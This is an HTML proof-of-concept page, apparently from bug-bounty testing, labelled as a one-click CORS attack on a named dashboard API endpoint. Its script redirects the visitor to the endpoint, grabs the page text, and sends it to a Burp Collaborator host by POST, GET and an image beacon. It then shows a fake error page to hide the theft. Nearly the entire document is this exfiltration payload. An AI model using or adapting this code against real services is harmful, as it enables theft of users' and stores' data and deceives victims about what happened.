<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - One Click</title>
</head>
<body style="font-family: Arial; padding: 50px;">
    <h1>CORS Attack - One Click</h1>
    <p>This will redirect you to the API endpoint after 3 seconds.</p>
    <p>You will see 2 alerts showing the stolen data.</p>
    <button onclick="attack()" style="padding: 20px; font-size: 18px; cursor: pointer;">
        START ATTACK
    </button>

    <script>
        // ===== CHANGE THIS TO YOUR COLLABORATOR URL =====
        var COLLABORATOR = 'https://your-id.burpcollaborator.net';
        // ================================================

        function attack() {
            alert('Redirecting to API in 3 seconds...\n\nYou will see the stolen data in the next alert.');
            setTimeout(function() {
                window.location.href = 'https://dashboard.route.com/api/mn/v1/stores';
            }, 3000);
        }

        // Auto-capture when on API page
        if (window.location.pathname.includes('/api/')) {
            var data = document.body.innerText;
            
            // Alert 1: Show data
            alert('STOLEN DATA:\n\n' + data);
            
            // Send to collaborator (3 methods)
            fetch(COLLABORATOR, {method: 'POST', mode: 'no-cors', body: data});
            fetch(COLLABORATOR + '?d=' + encodeURIComponent(data), {mode: 'no-cors'});
            new Image().src = COLLABORATOR + '?img=1&d=' + encodeURIComponent(data.substring(0, 500));
            
            // Alert 2: Confirm
            alert('Data sent to collaborator:\n' + COLLABORATOR + '\n\nCheck Burp Collaborator now!');
            
            // Fake error
            setTimeout(function() {
                document.body.innerHTML = '<h1>Error</h1><p>Please try again later.</p>';
            }, 2000);
        }
    </script>
</body>
</html>
